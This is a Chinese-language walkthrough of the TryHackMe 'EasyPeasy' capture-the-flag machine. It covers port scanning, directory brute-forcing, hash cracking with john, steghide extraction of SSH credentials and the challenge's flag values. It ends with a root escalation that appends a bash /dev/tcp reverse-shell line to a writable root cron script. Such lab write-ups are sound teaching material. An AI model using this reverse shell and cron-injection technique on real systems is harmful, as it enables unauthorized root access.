# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/tryhackme/EasyPeasy]
└─# nmap -sV -Pn 10.10.246.60 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 03:25 EST
Nmap scan report for 10.10.246.60
Host is up (0.30s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 829.53 seconds


```

80端口，打开是一个nginx的欢迎页面，源代码找到flag3
```
They are activated by symlinking availableconfiguration files from their respectiveFl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}*-available/ counterparts. These should be managedby using our helpers
```

65524也一个http端口，打开是一个apache的欢迎页，源代码无特别东西。

## 爆破80目录

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.246.60 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545

Output File: /root/dirsearch/reports/10.10.246.60/_21-11-12_03-36-16.txt

Error Log: /root/dirsearch/logs/errors-21-11-12_03-36-16.log

Target: http://10.10.246.60/

[03:36:17] Starting: 
[03:37:38] 301 -  169B  - /hidden  ->  http://10.10.246.60/hidden/    
```

/hidden文件夹下有一张图片，下载到本地以后不能分离出文件，可能需要密码


继续爆破hidder下的目录：

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.246.60/hidden -w /usr/share/wordlists/dirb/small.txt 

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                
                                                                                                                                                                       
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 959

Output File: /root/dirsearch/reports/10.10.246.60/-hidden_21-11-14_09-45-18.txt

Error Log: /root/dirsearch/logs/errors-21-11-14_09-45-18.log

Target: http://10.10.246.60/hidden/

[09:45:19] Starting: 
[09:45:31] 301 -  169B  - /hidden/whatever  ->  http://10.10.246.60/hidden/whatever/

```

打开```/whatever```目录，显示：
```
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```


隐藏的p元素base64解密出来得到第一个flag：```flag{f1rs7_fl4g}```



## 爆破65524目录

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.246.60:65524/                                                                  

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.246.60-65524/-_21-11-12_03-51-03.txt

Error Log: /root/dirsearch/logs/errors-21-11-12_03-51-03.log

Target: http://10.10.246.60:65524/

[03:51:04] Starting:    
[03:52:34] 200 -   11KB - /index.html                                       
[03:53:12] 200 -  153B  - /robots.txt                                       
```

robots.txt显示：
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```


md5解出来是：```flag{1m_s3c0nd_fl4g}```,为flag2

下载easypeasy.txt文件到本地，grep以后得到flag3
```
┌──(root💀kali)-[~/tryhackme/EasyPeasy]
└─# cat easypeasy.txt|grep flag                                                                                                                                                                                                         1 ⨯
flag{9fdafbd64c47471a8f54cd3fc64cd312}
flagsrule
flags2
flags101
flagirl
flagflag
flagator
flag93
flag890
flag2006
flag11

```

## 检查源码是个好习惯
在这里好像走入死胡同了，回到apache页面，在源码里找到另一个东西：
```
<span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
```

这个是base62加密，解出来是：```/n0th1ng3ls3m4tt3r```

浏览器打开隐藏文件夹，看到一张图片，查看网页源代码：
```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

## john爆破哈希
把```940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81```保存到hash.txt，用john破解：
```
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# john --wordlist=easypeasy.txt --format=gost hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)
1g 0:00:00:00 DONE (2021-11-14 10:01) 50.00g/s 204800p/s 204800c/s 204800C/s vgazoom4x..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

得到一个密码：```mypasswordforthatjob```

## 图片隐写

我们把```binarycodepixabay.jpg```这张图片下载到本地，用steghide命令以及上面破译的密码作为解密密令，分离出一个```secrettext.txt```文件

```
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# steghide extract -sf binarycodepixabay.jpg          
Enter passphrase: 
wrote extracted data to "secrettext.txt".
                                                                                                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# ls
binarycodepixabay.jpg  easypeasy.txt  hash.txt  lost-places-1928727_960_720.jpg  secrettext.txt
                                                                                                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

```

# 拿到初始shell

把上面的二进制转成文本如下：
```iconvertedmypasswordtobinary```

所以现在我们得到了一个ssh凭证：```boring：iconvertedmypasswordtobinary```


登录ssh，拿到user.txt

```
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# ssh boring@10.10.246.60 -p 6498           
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.246.60's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}

```


去到[这个网站](https://cryptii.com/pipes/rot13-decoder)，用rot13解密得到user flag


# 提权到root

传linpea，发现有一个root执行的定时任务：

```
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

查看定时任务内容以及权限：

```
boring@kral4-PC:/var/www$ ls -alh
total 16K
drwxr-xr-x  3 root   root   4.0K Jun 15  2020 .
drwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..
drwxr-xr-x  4 root   root   4.0K Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
#!/bin/bash
# i will run as root

```

看来我们有写入权限

写shell进定时任务脚本：

```
boring@kral4-PC:/var/www$ echo "bash -i >& /dev/tcp/10.13.21.169/4242 0>&1" >> /var/www/.mysecretcronjob.sh
boring@kral4-PC:/var/www$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
bash -i >& /dev/tcp/10.13.21.169/4242 0>&1

```


另外开一个shell监听4242端口，一分钟后收到反弹的shell：
```
┌──(root💀kali)-[~/tryhackme/easypeasy]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.246.60] 33184
bash: cannot set terminal process group (16165): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:~# whoami
whoami
root
```

拿到root.txt
```
root@kral4-PC:~# ls -alh
ls -alh
total 40K
drwx------  5 root root 4.0K Jun 15  2020 .
drwxr-xr-x 23 root root 4.0K Jun 15  2020 ..
-rw-------  1 root root    2 Nov 14 07:35 .bash_history
-rw-r--r--  1 root root 3.1K Jun 15  2020 .bashrc
drwx------  2 root root 4.0K Jun 13  2020 .cache
drwx------  3 root root 4.0K Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4.0K Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor

```
